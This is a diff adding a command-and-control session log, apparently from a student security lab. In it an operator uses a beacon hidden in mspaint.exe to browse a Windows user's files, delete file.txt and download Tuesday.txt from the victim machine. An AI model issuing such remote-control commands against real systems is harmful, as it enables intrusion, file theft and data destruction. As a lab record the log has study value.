@@ -1,0 +1,158 @@
+12/15 13:45:45 UTC [metadata] 192.168.1.20 <- 192.168.1.20; computer: ACER; user: david; process: mspaint.exe; pid: 15656; os: Windows; version: 10.0; build: 22621; beacon arch: x64 (x64)
+12/15 13:46:18 UTC [input] <neo> ls
+12/15 13:46:18 UTC [task] <> Tasked beacon to list files in .
+12/15 13:46:42 UTC [checkin] host called home, sent: 19 bytes
+12/15 13:46:42 UTC [output]
+C:\Users\david\AppData\Local\Temp\RarSFX5\*
+D	0	12/15/2022 20:44:42	.
+D	0	12/15/2022 20:46:13	..
+F	927232	12/15/2022 20:43:09	a.exe
+F	2247	12/15/2022 15:25:31	Google Chrome.lnk
+
+
+12/15 13:46:48 UTC [input] <neo> ls
+12/15 13:46:48 UTC [task] <> Tasked beacon to list files in .
+12/15 13:47:42 UTC [checkin] host called home, sent: 19 bytes
+12/15 13:47:42 UTC [output]
+C:\Users\david\AppData\Local\Temp\RarSFX5\*
+D	0	12/15/2022 20:44:42	.
+D	0	12/15/2022 20:47:40	..
+F	927232	12/15/2022 20:43:09	a.exe
+F	2247	12/15/2022 15:25:31	Google Chrome.lnk
+
+
+12/15 13:48:10 UTC [input] <neo> cd ../../../..
+12/15 13:48:10 UTC [task] <> cd ../../../..
+12/15 13:48:33 UTC [input] <neo> pwd
+12/15 13:48:33 UTC [task] <> Tasked beacon to print working directory
+12/15 13:48:42 UTC [checkin] host called home, sent: 27 bytes
+12/15 13:48:42 UTC [output]
+Current directory is C:\Users\david
+
+12/15 13:48:51 UTC [input] <neo> ls
+12/15 13:48:51 UTC [task] <> Tasked beacon to list files in .
+12/15 13:49:15 UTC [input] <neo> cd Downloads
+12/15 13:49:15 UTC [task] <> cd Downloads
+12/15 13:49:19 UTC [input] <neo> ls
+12/15 13:49:19 UTC [task] <> Tasked beacon to list files in .
+12/15 13:49:42 UTC [checkin] host called home, sent: 55 bytes
+12/15 13:49:42 UTC [output]
+C:\Users\david\*
+D	0	12/13/2022 17:46:30	.
+D	0	10/15/2022 12:35:02	..
+F	5791	11/06/2022 18:38:12	-1.14-windows.xml
+D	0	11/25/2022 10:07:08	.aws
+D	0	11/25/2022 10:07:08	.azure
+D	0	12/03/2022 13:06:40	.conda
+F	25	11/25/2022 10:39:53	.condarc
+D	0	11/25/2022 10:39:36	.continuum
+D	0	11/25/2022 10:07:14	.docker
+D	0	12/13/2022 17:46:34	.dotnet
+D	0	11/23/2022 13:56:39	.ipython
+D	0	12/03/2022 13:05:56	.jupyter
+D	0	11/14/2022 19:12:31	.Ld9VirtualBox
+D	0	10/29/2022 13:45:04	.m2
+D	0	11/23/2022 13:56:36	.matplotlib
+D	0	11/03/2022 16:35:37	.nbi
+D	0	12/13/2022 17:46:30	.nuget
+D	0	12/07/2022 16:09:59	.omnisharp
+F	176	12/12/2022 12:41:24	.packettracer
+D	0	11/25/2022 11:08:54	.spyder-py3
+D	0	12/07/2022 16:09:38	.templateengine
+D	0	08/27/2022 00:49:02	.vscode
+D	0	09/21/2022 12:27:39	AppData
+D	0	09/21/2022 12:06:48	Application Data
+D	0	12/05/2022 13:47:33	Cisco Packet Tracer 8.1.1
+D	0	09/21/2022 12:29:43	Contacts
+D	0	09/21/2022 12:06:48	Cookies
+D	0	11/15/2022 16:38:59	Documents
+D	0	12/15/2022 20:49:28	Downloads
+D	0	09/21/2022 12:29:43	Favorites
+D	0	12/08/2022 10:23:41	GNS3
+D	0	12/15/2022 20:19:06	IntelGraphicsProfiles
+D	0	11/23/2022 19:25:04	Jedi
+D	0	09/21/2022 12:29:43	Links
+D	0	09/21/2022 12:06:48	Local Settings
+D	0	09/21/2022 12:29:43	Music
+D	0	09/21/2022 12:06:48	My Documents
+D	0	09/21/2022 12:06:48	NetHood
+F	13369344	12/15/2022 16:24:50	NTUSER.DAT
+F	3343360	09/21/2022 12:06:48	ntuser.dat.LOG1
+F	425984	09/21/2022 12:06:48	ntuser.dat.LOG2
+F	65536	09/21/2022 12:06:48	NTUSER.DAT{a2332f18-cdbf-11ec-8680-002248483d79}.TM.blf
+F	524288	09/21/2022 12:06:48	NTUSER.DAT{a2332f18-cdbf-11ec-8680-002248483d79}.TMContainer00000000000000000001.regtrans-ms
+F	524288	09/21/2022 12:06:48	NTUSER.DAT{a2332f18-cdbf-11ec-8680-002248483d79}.TMContainer00000000000000000002.regtrans-ms
+F	20	09/21/2022 12:29:34	ntuser.ini
+D	0	12/07/2022 19:56:57	OneDrive
+D	0	09/21/2022 12:06:48	PrintHood
+D	0	09/21/2022 12:06:48	Recent
+D	0	09/21/2022 12:29:43	Saved Games
+D	0	09/21/2022 12:29:43	Searches
+D	0	09/21/2022 12:06:48	SendTo
+D	0	08/26/2022 07:40:26	source
+D	0	09/21/2022 12:06:48	Start Menu
+D	0	09/21/2022 12:06:48	Templates
+D	0	08/26/2022 07:29:39	Tracing
+D	0	12/15/2022 14:19:52	Videos
+
+
+12/15 13:49:42 UTC [output]
+C:\Users\david\Downloads\*
+D	0	12/15/2022 20:49:28	.
+D	0	12/13/2022 17:46:30	..
+F	403	11/26/2022 11:24:02	1.txt
+F	12086	10/20/2022 14:23:55	1379078_pdf icon_adobe_pdf_acrobat_file_icon.png
+F	370316	10/19/2022 20:07:46	283222267_5117274371693664_3691982071578596292_n.jpg
+F	1846062	12/10/2022 18:19:27	C1NE.03-Implement-and-testing.pdf
+F	282	09/21/2022 12:29:43	desktop.ini
+F	25	12/15/2022 20:46:40	file.txt
+D	0	12/13/2022 13:37:47	Installed
+F	171	12/15/2022 16:21:11	nhi?m v? ch? nh?t.txt
+D	0	12/15/2022 20:49:28	testcap
+F	19597	12/14/2022 09:12:31	yellow.jpg
+F	162	10/28/2022 09:44:07	~$mo Nhóm 7.docx
+F	162	11/07/2022 13:58:22	~$U-CS447_NIS_CONCEIVE_GROUP_3.docx
+
+
+12/15 13:50:02 UTC [input] <neo> rm file.txt
+12/15 13:50:02 UTC [task] <T1107, > Tasked beacon to remove file.txt
+12/15 13:50:42 UTC [checkin] host called home, sent: 16 bytes
+12/15 13:51:14 UTC [input] <neo> download Tuesday.txt
+12/15 13:51:14 UTC [task] <T1005> Tasked beacon to download Tuesday.txt
+12/15 13:51:42 UTC [checkin] host called home, sent: 19 bytes
+12/15 13:51:42 UTC [output]
+started download of C:\Users\david\Downloads\Tuesday.txt (171 bytes)
+
+12/15 13:51:42 UTC [output]
+download of Tuesday.txt is complete
+
+12/15 13:55:51 UTC [metadata] 192.168.1.20 <- 192.168.1.20; computer: ACER; user: david; process: mspaint.exe; pid: 15656; os: Windows; version: 10.0; build: 22621; beacon arch: x64 (x64)
+12/15 13:56:51 UTC [metadata] 192.168.1.20 <- 192.168.1.20; computer: ACER; user: david; process: mspaint.exe; pid: 15656; os: Windows; version: 10.0; build: 22621; beacon arch: x64 (x64)
+12/15 14:27:00 UTC [metadata] 192.168.1.9 <- 192.168.1.20; computer: ACER; user: david; process: mspaint.exe; pid: 15656; os: Windows; version: 10.0; build: 22621; beacon arch: x64 (x64)
+12/15 14:26:58 UTC [input] <neo> ls
+12/15 14:26:58 UTC [task] <> Tasked beacon to list files in .
+12/15 14:27:50 UTC [checkin] host called home, sent: 19 bytes
+12/15 14:27:50 UTC [output]
+C:\Users\david\Downloads\*
+D	0	12/15/2022 20:52:34	.
+D	0	12/13/2022 17:46:30	..
+F	403	11/26/2022 11:24:02	1.txt
+F	12086	10/20/2022 14:23:55	1379078_pdf icon_adobe_pdf_acrobat_file_icon.png
+F	370316	10/19/2022 20:07:46	283222267_5117274371693664_3691982071578596292_n.jpg
+F	1846062	12/10/2022 18:19:27	C1NE.03-Implement-and-testing.pdf
+F	282	09/21/2022 12:29:43	desktop.ini
+D	0	12/13/2022 13:37:47	Installed
+D	0	12/15/2022 20:49:28	testcap
+F	19597	12/14/2022 09:12:31	yellow.jpg
+F	162	10/28/2022 09:44:07	~$mo Nhóm 7.docx
+F	162	11/07/2022 13:58:22	~$U-CS447_NIS_CONCEIVE_GROUP_3.docx
+
+
+12/15 14:28:47 UTC [input] <neo> exit
+12/15 14:28:47 UTC [task] <> Tasked beacon to exit
+12/15 14:28:50 UTC [checkin] host called home, sent: 8 bytes
+12/15 14:28:50 UTC [output]
+beacon exit.
+
+12/15 14:29:07 UTC [input] <neo> exit
+12/15 14:29:07 UTC [task] <> Tasked beacon to exit
